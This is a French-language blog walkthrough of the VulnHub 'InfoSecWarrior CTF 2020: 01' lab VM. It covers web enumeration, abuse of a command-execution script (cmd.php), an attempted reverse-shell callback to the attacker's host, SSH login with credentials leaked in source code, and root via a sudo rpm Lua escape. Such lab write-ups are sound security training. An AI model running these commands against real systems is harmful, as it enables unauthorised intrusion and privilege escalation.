---
title: "Solution du CTF InfoSecWarrior CTF 2020: 01 de VulnHub"
tags: [VulnHub, CTF]
---

[InfoSecWarrior CTF 2020: 01](https://vulnhub.com/entry/infosecwarrior-ctf-2020-01,446/) fait partie de ces CTFs fait maladroitement dont on ne sait pas trop si certains éléments sont intentionnellement cassés ou si la VM est en carafe.

Ainsi sur la VM qui fait tourner un SSH et un serveur web on trouve via énumération un Wordpress mais ce dernier retourne une erreur 500.

```
301        9l       28w      320c http://192.168.56.152/wordpress
302        2l        0w        2c http://192.168.56.152/cmd.php
200        5l       18w      120c http://192.168.56.152/note.txt
200       17l       12w      292c http://192.168.56.152/sitemap.xml
```

L'énumération plus poussée remonte quelques fichiers dont un script `cmd.php` pour lequel je me suis mis à la recherche d'un paramètre valide :

```bash
ffuf -u "http://192.168.56.152/cmd.php" -d 'FUZZ=id' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlists/common_query_parameter_names.txt  -fs 2
```

Sans succès...

Finalement en regardant le `sitemap` je relève la présence d'une typo pour le fichier d'index.

```xml
<urlset xmlns="http://infosecwarrior.com/sitemap/0.9">
<url>
<loc>http://infosecwarrior.com/index.htnl</loc>
<lastmod>2020-02-13</lastmod>
<changefreq>monthly</changefreq>
<priority>0.8</priority>
</url>
</urlset>
```

Le fichier existe bel et bien avec l'erreur et on y trouve un formulaire avec le paramètre qui nous manquait :

```html
<form action = "/cmd.php" hidden="True" method = "GET">
 command
     <input type = "text" name = "AI" value = "" maxlength = "100" />
 <br />
 <input type = "submit" value ="Submit" />
</form>
```

Le tout doit être soumis en POST contrairement à ce qu'indique le formulaire :

```console
$ curl -XPOST http://192.168.56.152/cmd.php --data "AI=id"
You Found ME : - (<pre>uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

On est sur un vieux système, qui plus est en 32bits :

```
Linux InfosecWarrior 2.6.32-754.el6.i686 #1 SMP Tue Jun 19 21:51:20 UTC 2018 i686 i686 i386 GNU/Linux
```

J'ai tenté d'obtenir un reverse shell avec `reverse-sshx86` mais le système bloque nos connexions. Sans doute un problème lié à SELinux puisque les binaires `curl` et `wget` du système n'ont pas ce type de restriction.

```console
$ curl -XPOST http://192.168.56.152/cmd.php --data "AI=wordpress/wp-content/reverse-sshx86 -v -p 80 192.168.56.1 2>%261"
You Found ME : - (<pre>2023/04/03 15:12:46 Dialling home via ssh to 192.168.56.1:80
2023/04/03 13:12:46 dial tcp 192.168.56.1:80: connect: permission denied
```

À première vue difficile d'avancer à ce stade. Mais en regardant le code source de `cmd.php` je trouve des identifiants :

```php
$user="isw0";
$pass="123456789blabla";
```

Ca matche avec un utilisateur du système :

```
isw0:x:500:500::/home/isw0:/bin/bash
isw1:x:501:501::/home/isw1:/home/isw1/bash
isw2:x:502:502::/home/isw2:/bin/bash
```

Vieux système dit aussi vieux protocoles :

```console
$ ssh isw0@192.168.56.152
Unable to negotiate with 192.168.56.152 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

Avec une option supplémentaire je parviens à me connecter au SSH :

```console
$ ssh -oHostKeyAlgorithms=+ssh-rsa isw0@192.168.56.152
The authenticity of host '192.168.56.152 (192.168.56.152)' can't be established.
RSA key fingerprint is SHA256:rNHlcfJ22Jb4j6wQvLvKK/+tc9khM8tM3yq9yDiz6dQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.152' (RSA) to the list of known hosts.
isw0@192.168.56.152's password: 
Last login: Mon Feb 17 13:56:07 2020 from 192.168.56.1
[isw0@InfosecWarrior ~]$ id
uid=500(isw0) gid=500(isw0) groupes=500(isw0) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

On a visiblement le droit d'exécuter `/bin/bash` en tant que n'importe quel utilisateur sauf `root` mais dans la pratique ça n'a pas marché pour une raison inconnue.

```console
[isw0@InfosecWarrior ~]$ sudo -l
Matching Defaults entries for isw0 on this host:
    !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User isw0 may run the following commands on this host:
    (!root) NOPASSWD: /bin/bash
    (root) /bin/ping, (root) /bin/ping6, (root) /bin/rpm, (root) /bin/ls, (root) /bin/mktemp
```

Peu importe, il y a un _GTFObin_ pour la commande RPM : https://gtfobins.github.io/gtfobins/rpm/#sudo

```console
[isw0@InfosecWarrior ~]$ sudo /bin/rpm --eval '%{lua:os.execute("/bin/sh")}'
sh-4.1# id
uid=0(root) gid=0(root) groupes=0(root) contexte=unconfined_u:system_r:rpm_script_t:s0-s0:c0.c1023
sh-4.1# cd /root
sh-4.1# ls
anaconda-ks.cfg  Armour.sh  flag.txt  install.log  install.log.syslog
sh-4.1# cat flag.txt
fc9c6eb6265921315e7c70aebd22af7e
```
